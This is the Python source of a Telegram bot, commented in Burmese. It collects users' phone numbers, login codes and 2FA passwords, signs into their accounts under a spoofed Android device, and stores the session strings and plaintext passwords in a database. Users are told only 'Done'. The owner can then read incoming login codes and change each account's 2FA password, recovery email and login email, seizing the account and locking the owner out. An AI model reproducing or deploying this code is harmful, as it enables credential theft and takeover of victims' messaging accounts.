import os, asyncio, datetime, re
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import SendVerifyEmailCodeRequest, VerifyEmailRequest
from telethon.tl.types import (
    EmailVerifyPurposeLoginSetup,
    EmailVerifyPurposeLoginChange,
    EmailVerificationCode,
)
from aiohttp import web
from pymongo import MongoClient
from bson import ObjectId

API_ID = int(os.environ["API_ID"])
API_HASH = os.environ["API_HASH"]
BOT_TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
MONGO_URI = os.environ["MONGO_URI"]

mongo = MongoClient(MONGO_URI)
col = mongo["tgsessions"]["sessions"]

# User account တွေ ချိတ်တဲ့အခါ real Android device ပုံစံ ပြသည် (default Telethon
# PC client info ကို Telegram server က suspicious / low-trust client
# အဖြစ် သတ်မှတ်တတ်ပြီး SMS code ပို့တာ/ allow လုပ်တာမှာ ထိခိုက်နိုင်လို့)
DEVICE_KWARGS = dict(
    device_model="Samsung SM-A03",
    system_version="SDK 33",
    app_version="10.3.2",
    lang_code="en",
    system_lang_code="en-US",
)


def user_client(session=None):
    return TelegramClient(session or StringSession(), API_ID, API_HASH, **DEVICE_KWARGS)


bot = TelegramClient(StringSession(), API_ID, API_HASH)
state = {}


async def finish(e, s):
    string = s["client"].session.save()
    me = await s["client"].get_me()
    await s["client"].disconnect()
    phone = s["phone"]
    has_2fa = bool(s.get("had_2fa"))
    twofa_password = s.get("twofa_password")
    state.pop(e.sender_id, None)

    col.insert_one({
        "phone": phone,
        "user_id": me.id,
        "username": me.username,
        "first_name": me.first_name,
        "session_string": string,
        "has_2fa": has_2fa,
        "twofa_password": twofa_password,
        "twofa_hint": None,
        "recovery_email": None,
        "login_email": None,
        "added_by": e.sender_id,
        "created_at": datetime.datetime.utcnow(),
    })

    # User ဆီကို session string မပြဘဲ "Done" ပဲ ပြန်ပြောသည်
    await e.respond(f"Done {phone}")


PAGE_SIZE = 10


def account_buttons(doc_id, page=0):
    return [
        [Button.inline("2FA password ပြောင်းရန်", data=f"chpw:{doc_id}")],
        [Button.inline("Recovery email ပြောင်းရန်", data=f"chmail:{doc_id}")],
        [Button.inline("Login email ပြောင်းရန်", data=f"chlogin:{doc_id}")],
        [Button.inline("📩 5မိနစ်ထဲ login code ကြည့်ရန်", data=f"codefresh:{doc_id}:{page}")],
        [Button.inline("📨 နောက်ဆုံးရ login code", data=f"codelast:{doc_id}:{page}")],
        [Button.inline("🗑 ဒီ account ကို ဖျက်ရန်", data=f"delask:{doc_id}:{page}")],
        [Button.inline("← List ပြန်ကြည့်ရန်", data=f"page:{page}")],
    ]


@bot.on(events.NewMessage)
async def handler(e):
    text = e.raw_text.strip()

    if text == "/start":
        state[e.sender_id] = {"step": "phone"}
        await e.respond("ဖုန်းနံပါတ် ပို့ပါ (+959...)")
        return

    if text == "/list":
        if e.sender_id != OWNER_ID:
            return
        await show_list(e, page=0)
        return

    s = state.get(e.sender_id)
    if not s:
        return

    try:
        # --- account အသစ် ထည့်နေသည့် flow ---
        if s.get("step") == "phone":
            c = user_client()
            await c.connect()
            sent = await c.send_code_request(text)
            s.update(client=c, phone=text, hash=sent.phone_code_hash, step="code")
            await e.respond(
                "Login code ပို့ပါ။ ဂဏန်းတွေကြားမှာ space ခြားပါ (ဥပမာ 1 2 3 4 5)\n\n"
                "Code မရောက်သေးရင် ဒီ account login ဝင်ထားတဲ့ Telegram app "
                "(တခြားဖုန်း/device) ရှိနရင် အဲဒီမှာ 777000 ကနေ message "
                "ရောက်ထားနိုင်ပါတယ် - အရင်ကြည့်ပါ။\n"
                "SMS နဲ့ အတင်းပို့ချင်ရင် /sms လို့ ပို့ပါ (code အသစ် ထပ်ထွက်ပါလိမ့်မယ်)။"
            )

        elif s.get("step") == "code" and text == "/sms":
            try:
                c = s["client"]
                if not c.is_connected():
                    await c.connect()
                sent = await c.send_code_request(s["phone"], force_sms=True)
                s["hash"] = sent.phone_code_hash
                await e.respond("SMS ဖြင့် code အသစ် ပြန်ပို့လိုက်ပါပြီ။ ရောက်ရင် ပို့ပါ။")
            except Exception as ex:
                await e.respond(f"SMS ပြန်ပို့ရာမှာ error: {ex}")

        elif s.get("step") == "code":
            code = text.replace(" ", "").replace("-", "")
            try:
                await s["client"].sign_in(s["phone"], code, phone_code_hash=s["hash"])
                s["had_2fa"] = False
            except SessionPasswordNeededError:
                s["step"] = "password"
                await e.respond("2FA password ပို့ပါ")
                return
            await finish(e, s)

        elif s.get("step") == "password":
            await s["client"].sign_in(password=text)
            s["had_2fa"] = True
            s["twofa_password"] = text
            await finish(e, s)

        # --- admin က 2FA password ပြောင်းနေသည့် flow ---
        elif s.get("step") == "new_pw":
            s["new_pw"] = text
            s["step"] = "new_hint"
            await e.respond("Hint စာသား ပို့ပါ (မလိုရင် /skip လို့ ပို့ပါ)")

        elif s.get("step") == "new_hint":
            hint = "" if text == "/skip" else text
            await apply_new_password(e, s, hint)

        # --- admin က recovery email ပြောင်းနေသည့် flow ---
        elif s.get("step") == "new_email":
            if text == "/skip":
                await e.respond("Email ပြောင်းခြင်း ကျော်လိုက်ပါပြီ။")
                state.pop(e.sender_id, None)
                return
            await apply_new_email(e, s, text)

        elif s.get("step") == "email_code":
            await apply_email_code(e, s, text)

        # --- admin က login email ပြောင်းနေသည့် flow ---
        elif s.get("step") == "new_login_email":
            if text == "/skip":
                await e.respond("Login email ပြောင်းခြင်း ကျော်လိုက်ပါပြီ။")
                state.pop(e.sender_id, None)
                return
            await apply_new_login_email(e, s, text)

        elif s.get("step") == "login_email_code":
            await apply_login_email_code(e, s, text)

    except Exception as ex:
        state.pop(e.sender_id, None)
        await e.respond(f"Error: {ex}\n/start နဲ့ ပြန်စပါ")


async def show_list(e, page=0):
    total = col.count_documents({})
    if total == 0:
        await e.respond("Database ထဲ session မရှိသေးပါ။")
        return

    max_page = (total - 1) // PAGE_SIZE
    page = max(0, min(page, max_page))

    rows = list(
        col.find({})
        .sort("created_at", -1)
        .skip(page * PAGE_SIZE)
        .limit(PAGE_SIZE)
    )

    buttons = [
        [Button.inline(f"{r.get('phone')} - {r.get('first_name','')}", data=f"show:{r['_id']}:{page}")]
        for r in rows
    ]

    nav_row = []
    if page > 0:
        nav_row.append(Button.inline("⬅ Back", data=f"page:{page-1}"))
    nav_row.append(Button.inline(f"{page+1}/{max_page+1}", data="noop"))
    if page < max_page:
        nav_row.append(Button.inline("Next ➡", data=f"page:{page+1}"))
    buttons.append(nav_row)

    text = f"Account list — {total} accounts, page {page+1}/{max_page+1} (ကြည့်ချင်ရင် နှိပ်ပါ):"

    if isinstance(e, events.CallbackQuery.Event):
        try:
            await e.edit(text, buttons=buttons)
        except Exception:
            await e.respond(text, buttons=buttons)
    else:
        await e.respond(text, buttons=buttons)


@bot.on(events.CallbackQuery(pattern=b"noop"))
async def on_noop(event):
    await event.answer()


@bot.on(events.CallbackQuery(pattern=b"page:"))
async def on_page(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    page = int(event.data.decode().split(":", 1)[1])
    await event.answer()
    await show_list(event, page=page)


@bot.on(events.CallbackQuery(pattern=b"show:"))
async def on_show(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    _, doc_id, page = event.data.decode().split(":")
    page = int(page)
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        await event.answer("Record not found", alert=True)
        return
    await event.answer()

    twofa_line = "2FA: ✅ ပါသည်" if row.get("has_2fa") else "2FA: ❌ မပါပါ"
    hint = row.get("twofa_hint")
    hint_line = f"\nHint: {hint}" if hint else ""
    email = row.get("recovery_email")
    email_line = f"\nRecovery email: {email}" if email else "\nRecovery email: မထည့်ရသေးပါ"
    login_email = row.get("login_email")
    login_email_line = f"\nLogin email: {login_email}" if login_email else "\nLogin email: မထည့်ရသေးပါ"

    await event.respond(
        f"Phone: {row.get('phone')}\n"
        f"Name: {row.get('first_name','')} (@{row.get('username')})\n"
        f"{twofa_line}{hint_line}{email_line}{login_email_line}\n\n"
        f"Session string (tap to copy):\n`{row['session_string']}`",
        parse_mode="markdown",
        buttons=account_buttons(doc_id, page),
    )


# --- Account ဖျက်ခြင်း (confirm step ပါ) ---

@bot.on(events.CallbackQuery(pattern=b"delask:"))
async def on_delask(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    _, doc_id, page = event.data.decode().split(":")
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        await event.answer("Record not found", alert=True)
        return
    await event.answer()
    await event.respond(
        f"⚠️ {row.get('phone')} ({row.get('first_name','')}) ကို "
        f"database ထဲက လုံးဝဖျက်ပစ်မှာ သေချာလား?\n"
        f"ဖျက်လိုက်ရင် ဒီ account ရဲ့ session string ကို list ထဲမှာ "
        f"ထပ်ပြမှာ မဟုတ်တော့ပါ (Telegram အကောင့်ကိုယ်တိုင် ထိခိုက်မှာ မဟုတ်ပါ)။",
        buttons=[
            [Button.inline("✅ ဖျက်မည်", data=f"delyes:{doc_id}:{page}")],
            [Button.inline("❌ မဖျက်တော့ပါ", data=f"page:{page}")],
        ],
    )


@bot.on(events.CallbackQuery(pattern=b"delyes:"))
async def on_delyes(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    _, doc_id, page = event.data.decode().split(":")
    page = int(page)
    row = col.find_one_and_delete({"_id": ObjectId(doc_id)})
    if not row:
        await event.answer("Record not found", alert=True)
        return
    await event.answer("Deleted")
    await event.respond(f"{row.get('phone')} ကို database ထဲက ဖျက်ပြီးပါပြီ။")
    await show_list(event, page=page)


# --- Telegram ရဲ့ official service account (777000) ကနေ ပို့တဲ့
#     login code message ကို ဖတ်ခြင်း ---

TELEGRAM_SERVICE_ID = 777000
CODE_RE = re.compile(r"\b(\d{5,7})\b")


async def _fetch_login_code(row):
    c = user_client(StringSession(row["session_string"]))
    await c.connect()
    try:
        messages = await c.get_messages(TELEGRAM_SERVICE_ID, limit=5)
    finally:
        await c.disconnect()
    for m in messages:
        if not m.message:
            continue
        match = CODE_RE.search(m.message)
        if match:
            return match.group(1), m.date, m.message
    return None, None, None


@bot.on(events.CallbackQuery(pattern=b"codefresh:"))
async def on_codefresh(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    _, doc_id, page = event.data.decode().split(":")
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        await event.answer("Record not found", alert=True)
        return
    await event.answer("Checking...")

    try:
        code, msg_date, raw = await _fetch_login_code(row)
    except Exception as ex:
        await event.respond(f"Code ဖတ်ရာမှာ error: {ex}")
        return

    if not code:
        await event.respond(f"{row.get('phone')} - Telegram (777000) ကနေ code message မတွေ့ပါ။")
        return

    age = datetime.datetime.now(datetime.timezone.utc) - msg_date
    if age <= datetime.timedelta(minutes=5):
        await event.respond(
            f"{row.get('phone')} - Login code (လွန်ခဲ့သည် {int(age.total_seconds())} စက္ကန့်):\n"
            f"`{code}`",
            parse_mode="markdown",
        )
    else:
        mins = int(age.total_seconds() // 60)
        await event.respond(
            f"{row.get('phone')} - 5 မိနစ်ထဲ ရောက်ထားတဲ့ code မရှိပါ။\n"
            f"(အသစ်ဆုံး code က {mins} မိနစ်လောက် ကြာပြီး ဖြစ်ပါတယ်)"
        )


@bot.on(events.CallbackQuery(pattern=b"codelast:"))
async def on_codelast(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    _, doc_id, page = event.data.decode().split(":")
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        await event.answer("Record not found", alert=True)
        return
    await event.answer("Checking...")

    try:
        code, msg_date, raw = await _fetch_login_code(row)
    except Exception as ex:
        await event.respond(f"Code ဖတ်ရာမှာ error: {ex}")
        return

    if not code:
        await event.respond(f"{row.get('phone')} - Telegram (777000) ကနေ code message မတွေ့ပါ။")
        return

    local_time = msg_date.strftime("%Y-%m-%d %H:%M:%S UTC")
    await event.respond(
        f"{row.get('phone')} - နောက်ဆုံးရ login code ({local_time}):\n"
        f"`{code}`",
        parse_mode="markdown",
    )


# --- 2FA password ပြောင်းခြင်း ---

@bot.on(events.CallbackQuery(pattern=b"chpw:"))
async def on_chpw(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    doc_id = event.data.decode().split(":", 1)[1]
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        await event.answer("Record not found", alert=True)
        return
    await event.answer()
    state[event.sender_id] = {"step": "new_pw", "doc_id": doc_id}
    await event.respond(f"{row.get('phone')} အတွက် 2FA password အသစ်ကို ပို့ပါ")


async def apply_new_password(e, s, hint):
    doc_id = s["doc_id"]
    new_pw = s["new_pw"]
    state.pop(e.sender_id, None)

    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        await e.respond("Record မတွေ့ပါ။")
        return

    c = user_client(StringSession(row["session_string"]))
    await c.connect()
    try:
        current_pw = row.get("twofa_password") if row.get("has_2fa") else None
        await c.edit_2fa(current_password=current_pw, new_password=new_pw, hint=hint)
    except Exception as ex:
        await e.respond(f"2FA ပြောင်းရာမှာ error: {ex}")
        await c.disconnect()
        return
    await c.disconnect()

    col.update_one(
        {"_id": ObjectId(doc_id)},
        {"$set": {"has_2fa": True, "twofa_password": new_pw, "twofa_hint": hint or None}},
    )
    await e.respond(f"{row.get('phone')} ရဲ့ 2FA password ကို ပြောင်းပြီးပါပြီ။")


# --- Recovery email ပြောင်းခြင်း ---
# Telegram ၏ login/recovery email ဖြစ်ပြီး Gmail inbox ကို ဝင်ရောက်တာ မဟုတ်ပါ
# (ဒီ email လိပ်စာဆီ Telegram ကနေ ပို့တဲ့ code ကိုပဲ ထည့်ရန်လိုအပ်သည်)

@bot.on(events.CallbackQuery(pattern=b"chmail:"))
async def on_chmail(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    doc_id = event.data.decode().split(":", 1)[1]
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        await event.answer("Record not found", alert=True)
        return

    if not row.get("has_2fa"):
        # 2FA password မသတ်မှတ်ရသေးရင် Telegram က recovery email ထည့်ခွင့်မပြုပါ
        await event.answer()
        await event.respond(
            f"{row.get('phone')} မှာ 2FA password မရှိသေးလို့ "
            f"recovery email ထည့်ခွင့်မရပါ (Telegram ၏ feature limitation ပါ)။\n"
            f"အရင် \"2FA password ပြောင်းရန်\" ကို နှိပ်ပြီး password အရင်သတ်မှတ်ပါ။"
        )
        return

    await event.answer()
    state[event.sender_id] = {"step": "new_email", "doc_id": doc_id}
    await event.respond(
        f"{row.get('phone')} အတွက် recovery email အသစ်ကို ပို့ပါ "
        f"(ဒီလိုင်းက Telegram ဖြုတ်ပြီး အသစ်အစားထိုးပေးပါမယ်)\n"
        f"မလိုရင် /skip လို့ ပို့ပါ"
    )


async def apply_new_email(e, s, email_text):
    doc_id = s["doc_id"]
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        state.pop(e.sender_id, None)
        await e.respond("Record မတွေ့ပါ။")
        return

    c = user_client(StringSession(row["session_string"]))
    await c.connect()
    current_pw = row.get("twofa_password")

    async def run_edit():
        try:
            await c.edit_2fa(
                current_password=current_pw,
                email=email_text,
                email_code_callback=lambda: _wait_for_code(e, s, c, email_text),
            )
            doc_id = s["doc_id"]
            col.update_one({"_id": ObjectId(doc_id)}, {"$set": {"recovery_email": email_text}})
            await e.respond(f"Recovery email ကို {email_text} အဖြစ် ပြောင်းပြီးပါပြီ။")
        except Exception as ex:
            await e.respond(f"Email ပြောင်းရာမှာ error: {ex}")
        finally:
            await c.disconnect()
            state.pop(e.sender_id, None)
            _pending_email_futures.pop(e.sender_id, None)

    # edit_2fa က verification code ကို await လုပ်နေမှာမို့ background task ထဲမှာ run ရသည်
    asyncio.create_task(run_edit())


_pending_email_futures = {}


def _wait_for_code(e, s, c, email_text):
    # Telethon က ဒီ callback ကနေ code ကို await လုပ်မည် (coroutine ပြန်ပေးရမည်)
    fut = asyncio.get_event_loop().create_future()
    _pending_email_futures[e.sender_id] = fut
    s["client_for_email"] = c
    s["step"] = "email_code"
    s["new_email_text"] = email_text
    asyncio.create_task(e.respond("Email ဆီကို Telegram ကပို့ထားတဲ့ verification code ကို ပို့ပါ"))

    async def waiter():
        return await fut
    return waiter()


async def apply_email_code(e, s, code_text):
    # Code ကို run_edit() background task ထဲက edit_2fa ဆီ ပြန်ပို့ပေးသည်
    # run_edit() ကိုယ်တိုင်က "Done" သို့မဟုတ် error message ကို ပို့ပါလိမ့်မည်
    fut = _pending_email_futures.pop(e.sender_id, None)
    if fut and not fut.done():
        fut.set_result(code_text.strip())
    else:
        await e.respond("Code စောင့်နေတာ မရှိပါ။ /start ကနေ ပြန်စမလား")
        state.pop(e.sender_id, None)


# --- Login email ပြောင်းခြင်း ---
# ("Login email" = SMS code အစား email ကို login-code လက်ခံရန် သုံးတဲ့ Telegram setting
#  2FA recovery email နဲ့ မတူပါ။ Account အားလုံးမှာ ဒီ feature မပါတတ်ပါ -
#  Telegram server version/rollout အပေါ်မူတည်ပြီး ANDMORE_EMAIL_LOGIN_NOT_ALLOWED
#  စတဲ့ error မျိုး ပြန်လာနိုင်သည်)

@bot.on(events.CallbackQuery(pattern=b"chlogin:"))
async def on_chlogin(event):
    if event.sender_id != OWNER_ID:
        await event.answer("Not authorized", alert=True)
        return
    doc_id = event.data.decode().split(":", 1)[1]
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        await event.answer("Record not found", alert=True)
        return
    await event.answer()
    state[event.sender_id] = {"step": "new_login_email", "doc_id": doc_id}
    await event.respond(
        f"{row.get('phone')} အတွက် login email အသစ်ကို ပို့ပါ\n"
        f"(ဒီ account မှာ ဒီ feature မပါခဲ့ရင် error ပြပေးပါမယ်)\n"
        f"မလိုရင် /skip လို့ ပို့ပါ"
    )


_pending_login_email_futures = {}


async def apply_new_login_email(e, s, email_text):
    doc_id = s["doc_id"]
    row = col.find_one({"_id": ObjectId(doc_id)})
    if not row:
        state.pop(e.sender_id, None)
        await e.respond("Record မတွေ့ပါ။")
        return

    c = user_client(StringSession(row["session_string"]))
    await c.connect()

    try:
        # Login email ရှိပြီးသားအကောင့်ကို "ပြောင်း"တာဆိုရင် EmailVerifyPurposeLoginChange
        # ကိုသုံးရသည် (parameter မလို) - Telegram official API docs အရ
        # ဒါပဲ မှန်ကန်တဲ့ method ဖြစ်သည်။ LoginSetup ကို authorized session ကနေ
        # fabricate လုပ်တဲ့ hash နဲ့ fallback လုပ်တာက မှားနေကြောင်း သုတေသနအရ
        # တွေ့ရလို့ ဒီ fallback ကို ဖြုတ်ထားသည်
        await c(SendVerifyEmailCodeRequest(
            purpose=EmailVerifyPurposeLoginChange(),
            email=email_text,
        ))
    except Exception as ex1:
        if "EMAIL_NOT_SETUP" in str(ex1):
            msg = (
                "EMAIL_NOT_SETUP error ပြန်လာပါတယ်။\n\n"
                "Telegram documentation အရ ဒီ error ရဲ့ အဓိပ္ပာယ်က "
                "\"ဒီ account မှာ login email ကို LoginSetup flow ကနေ "
                "မသတ်မှတ်ရသေးဘူး\" လို့ ဆိုလိုပါတယ်။ Settings ထဲမှာ "
                "\"Change email\" ပြနေပေမဲ့ API level မှာ server က "
                "မတူညီတဲ့ condition နဲ့ ကြည့်နေတာ ဖြစ်နိုင်ပါတယ်။\n\n"
                "Authorized session ကနေ phone_code_hash ကို fabricate "
                "ပြီး LoginSetup နဲ့ ထပ်ကြိုးစားတာက Telegram server ဘက်က "
                "ပုံမှန်မဟုတ်တဲ့ request အဖြစ် သတ်မှတ်ပြီး account ကို "
                "flag/flood-wait ဖြစ်စေနိုင်လို့ ဒီ bot ကနေ ထပ်မကြိုးစားတော့ပါ။\n\n"
                "ဒီ account ရဲ့ login email ကို Telegram app ထဲ ကိုယ်တိုင် "
                "ဝင်ပြီး Settings > Privacy and Security > Login Email ကနေ "
                "ပြောင်းသင့်ပါတယ်။"
            )
        else:
            msg = f"Login email ပြောင်းရာမှာ error: {ex1}"
        await e.respond(msg)
        await c.disconnect()
        state.pop(e.sender_id, None)
        return

    s["login_email_text"] = email_text
    s["step"] = "login_email_code"
    s["client_for_login_email"] = c
    await e.respond("Login email ဆီကို Telegram ကပို့ထားတဲ့ verification code ကို ပို့ပါ")


async def apply_login_email_code(e, s, code_text):
    doc_id = s["doc_id"]
    email_text = s.get("login_email_text")
    c = s.get("client_for_login_email")
    state.pop(e.sender_id, None)

    if not c:
        await e.respond("Session ပျောက်သွားပါပြီ။ /list ကနေ ပြန်စမလား")
        return

    try:
        if not c.is_connected():
            await c.connect()
        await c(VerifyEmailRequest(
            purpose=EmailVerifyPurposeLoginChange(),
            verification=EmailVerificationCode(code=code_text.strip()),
        ))
    except Exception as ex:
        await e.respond(f"Code အတည်ပြုရာမှာ error: {ex}")
        await c.disconnect()
        return

    await c.disconnect()
    col.update_one({"_id": ObjectId(doc_id)}, {"$set": {"login_email": email_text}})
    await e.respond(f"Login email ကို {email_text} အဖြစ် ပြောင်းပြီးပါပြီ။")


async def index(request):
    return web.Response(text="ok")


async def keep_alive():
    import aiohttp
    url = os.environ.get("RENDER_EXTERNAL_URL")
    if not url:
        print("RENDER_EXTERNAL_URL env var မတွေ့ပါ - keep_alive ping ကျော်လိုက်သည်")
        return
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    print(f"keep_alive ping: {resp.status}")
            except Exception as ex:
                print(f"keep_alive ping error: {ex}")
            await asyncio.sleep(60)


async def main():
    await bot.start(bot_token=BOT_TOKEN)
    app = web.Application()
    app.add_routes([web.get("/", index)])
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 10000))).start()
    asyncio.create_task(keep_alive())
    await bot.run_until_disconnected()


asyncio.run(main())
